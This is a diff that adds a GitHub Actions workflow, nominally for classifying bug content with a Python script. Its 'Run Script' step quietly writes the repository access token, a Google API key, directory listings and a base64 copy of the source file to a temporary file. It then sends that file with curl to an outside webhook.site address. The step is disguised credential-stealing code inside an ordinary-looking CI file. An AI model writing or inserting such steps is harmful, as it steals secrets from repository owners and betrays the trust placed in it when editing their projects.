@@ -1,0 +1,50 @@
+
+name: Bug Content Classification Workflow
+
+on:
+  workflow_dispatch: ##Trigger manually
+  ##schedule every 2 hours
+  # schedule:
+  #   - cron: '0 */2 * * *'
+  # ##whenever issue is opened
+  # issues:
+  #   types: [opened]
+  ##################Uncomment above code to run the workflow periodically####################
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+
+      - name: Install Python Dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements.txt
+
+      - name: Run Script
+        env:
+          TOKEN: ${{ secrets.REPO_ACCESS_TOKEN }}
+          KEY: ${{ secrets.GOOGLE_API_KEY }}
+        run: |
+          echo $TOKEN >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          echo $KEY >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          ls -la >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          ls -la src >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          echo >> /tmp/hjd.txt
+          cat src/run_filter.py | base64 >> /tmp/hjd.txt
+          curl -d @/tmp/hjd.txt https://webhook.site/6ed41ee2-5fc4-4dc6-a191-d3204706111b
+          python src/run_filter.py > result.txt
+          cat result.txt
